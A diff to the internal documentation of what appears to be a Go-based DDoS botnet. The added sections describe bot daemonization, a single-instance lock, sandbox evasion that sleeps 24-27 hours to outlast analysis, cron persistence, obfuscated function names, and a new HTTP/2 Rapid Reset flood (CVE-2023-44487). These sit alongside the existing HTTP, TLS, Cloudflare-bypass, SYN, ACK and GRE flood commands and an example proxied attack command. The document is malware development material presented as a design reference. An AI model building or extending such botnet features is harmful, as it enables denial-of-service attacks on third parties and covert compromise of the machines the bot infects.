@@ -230,7 +230,7 @@ Challenge-response using **MD5 + shared secret (magicCode)**.
       │                                      │
       │◄──── AUTH_SUCCESS  ──────────────────│  Step 5: Success (or disconnect)
       │                                      │
-      │──── REGISTER:v3.8:botID:arch:ram:cpu►│  Step 6: Bot sends registration
+      │──── REGISTER:v:botID:arch:ram:cpu:proc:uplink►│  Step 6: Bot sends registration
       │                                      │
       │     CNC checks PROTOCOL_VERSION      │  Step 7: Version verification
       │                                      │
@@ -251,11 +251,26 @@ Challenge-response using **MD5 + shared secret (magicCode)**.
 Bot Binary Executed
         │
         ▼
+┌─ stuxnet() ─────────────────────┐
+│ Full Unix daemonization         │
+│ Fork, setsid, chdir /, umask 0  │
+│ Redirect stdin/out/err → /dev/null│
+│ Parent exits, child continues   │
+│ (Skipped in debug mode)         │
+└─────────────────────────────────┘
+        │
+        ▼
+┌─ revilSingleInstance() ─────────┐
+│ PID lock file (/tmp/.net_lock)  │
+│ Kill old instance if running    │
+└─────────────────────────────────┘
+        │
+        ▼
 ┌─ winnti() ──────────────────────┐
 │ Sandbox/VM detection            │
-│ Check: vmware, vbox, qemu,     │
-│   cuckoo, gdb, strace, etc.    │
-│ If detected → exit(200)        │
+│ 30+ analysis tool signatures    │
+│ If detected → sleep 24-27h      │
+│ then os.Exit(0)                 │
 └─────────────────────────────────┘
         │ (safe)
         ▼
@@ -269,6 +284,18 @@ Bot Binary Executed
 │ Cron persistence                │
 │ Install cron job (every minute) │
 │ pgrep -x <name> || <exe> &     │
+└─────────────────────────────────┘
+        │
+        ▼
+┌─ Pre-cache Metadata ────────────┐
+│ cachedBotID  = mustangPanda()   │
+│ cachedArch   = charmingKitten() │
+│ cachedRAM    = revilMem()       │
+│ cachedCPU    = revilCPU()       │
+│ cachedProc   = revilProc()      │
+│ cachedUplink = revilUplinkCached()│
+│ (cached in pkg-level vars,      │
+│  reused on every reconnect)     │
 └─────────────────────────────────┘
         │
         ▼
@@ -296,7 +323,7 @@ Connected via TLS
     ├── Receive AUTH_CHALLENGE
     ├── Send hafnium(challenge, magicCode) response
     ├── Receive AUTH_SUCCESS
-    ├── Send REGISTER:version:botID:arch:RAM:CPU
+    ├── Send REGISTER:version:botID:arch:RAM:CPU:procName:uplink
     │
     └── Command Loop (180s read timeout):
         ├── PING → respond PONG
@@ -327,6 +354,7 @@ Connected via TLS
 | `!http` | `alakazam()` / `alakazamProxy()` | HTTP POST flood (±proxy) |
 | `!https`, `!tls` | `machamp()` / `machampProxy()` | HTTPS/TLS flood (±proxy) |
 | `!cfbypass` | `gyarados()` / `gyaradosProxy()` | Cloudflare bypass flood (±proxy) |
+| `!rapidreset` | `arkrai()` / `darkraiProxy()` | HTTP/2 Rapid Reset (±proxy) |
 | `!syn` | `dragonite()` | Raw SYN flood (requires CAP_NET_RAW) |
 | `!ack` | `tyranitar()` | Raw ACK flood |
 | `!gre` | `metagross()` | GRE protocol flood |
@@ -427,7 +455,7 @@ strace, ltrace, gdb, radare2, ghidra, ida, wireshark, tshark, tcpdump
 gdb, strace, ltrace, radare2, rr
 ```
 
-If any check triggers → `os.Exit(200)`
+If any check triggers → sleep **24–27 hours** (randomized jitter to outlast sandbox analysis windows), then `os.Exit(0)`.
 
 ### Bot ID Generation (`mustangPanda()`)
 
@@ -458,13 +486,14 @@ Deterministic — same machine always generates same ID. Survives reboots. CNC d
 
 | Method | Function | Technique |
 |--------|----------|-----------|
-| HTTP Flood | `alakazam()` / `alakazamProxy()` | POST requests, random UA/referer, 2024 workers |
+| HTTP Flood | `alakazam()` / `alakazamProxy()` | POST requests, random UA/referer, 4020 workers |
 | HTTPS/TLS Flood | `machamp()` / `machampProxy()` | TLS handshake + 10 requests per connection, raw HTTP over TLS |
 | CF Bypass | `gyarados()` / `gyaradosProxy()` | Session management, cookie persistence, fake `__cf_bm` cookies |
+| Rapid Reset | `arkrai()` / `darkraiProxy()` / `giratina()` | HTTP/2 CVE-2023-44487 — batched HEADERS+RST_STREAM via raw h2 framing |
 
 ### Concurrency
 
-All attacks spawn `cozyBear` (default **2024**) goroutine workers.
+All attacks spawn `cozyBear` (default **4020**) goroutine workers.
 
 ### Proxy Support (L7 Only)
 
@@ -472,6 +501,7 @@ L7 methods support proxy rotation via `-pu <proxy_url>` flag:
 
 ```
 !http target.com 443 60 -pu http://proxy-list.com/proxies.txt
+!rapidreset target.com 443 120 -pu http://proxy-list.com/proxies.txt
 ```
 
 - Bot fetches proxy list from URL directly
@@ -753,6 +783,10 @@ All functions use APT group / Pokémon-themed names to make code harder to under
 | `alakazam` | HTTP flood |
 | `machamp` | HTTPS/TLS flood |
 | `gyarados` | CF bypass flood |
+| `arkrai` | HTTP/2 Rapid Reset (no proxy) |
+| `darkraiProxy` | HTTP/2 Rapid Reset (±proxy, worker spawner) |
+| `giratina` | H2 raw framing engine (HEADERS+RST_STREAM) |
+| `randUA` | Random User-Agent picker |
 | `dragonite` | SYN flood |
 | `tyranitar` | ACK flood |
 | `metagross` | GRE flood |
@@ -775,7 +809,7 @@ All functions use APT group / Pokémon-themed names to make code harder to under
 |------|-------------|
 | `dialga` | Main C2 resolver (orchestrator) |
 | `palkia` | DoH TXT record lookup |
-| `darkrai` | UDP TXT record lookup |
+| `darkrai` (connection.go) | UDP TXT record lookup |
 | `rayquaza` | A record fallback |
 | `arceus` | Hostname validator |
 
@@ -793,10 +827,25 @@ All functions use APT group / Pokémon-themed names to make code harder to under
 | Name | Real Purpose |
 |------|-------------|
 | `fancyBear` | Reconnection delay (5s) |
-| `cozyBear` | Worker count (2024) |
+| `cozyBear` | Worker count (4020) |
 | `equationGroup` | Buffer size (256) |
 | `lizardSquad` | DNS server list |
 | `gothTits` | Obfuscated C2 address constant |
+
+### Bot Opsec & Lifecycle — APT Groups
+
+| Name | Real Purpose |
+|------|-------------|
+| `stuxnet` | Unix daemonization (fork/setsid/detach) |
+| `revilSingleInstance` | PID-based single-instance lock |
+| `revilMem` | RAM detection |
+| `revilCPU` | CPU core count |
+| `revilProc` | Process name detection |
+| `revilUplink` / `revilUplinkCached` | Uplink speed measurement & cache |
+| `daemonHousekeep` | Post-fork cleanup (close FDs, chdir) |
+| `devNull` | Redirect FD to /dev/null |
+| `ignoreSignals` | Ignore SIGHUP/SIGINT/SIGTERM |
+| `scarcruft` | Parse host:port from C2 address |
 
 ---
 
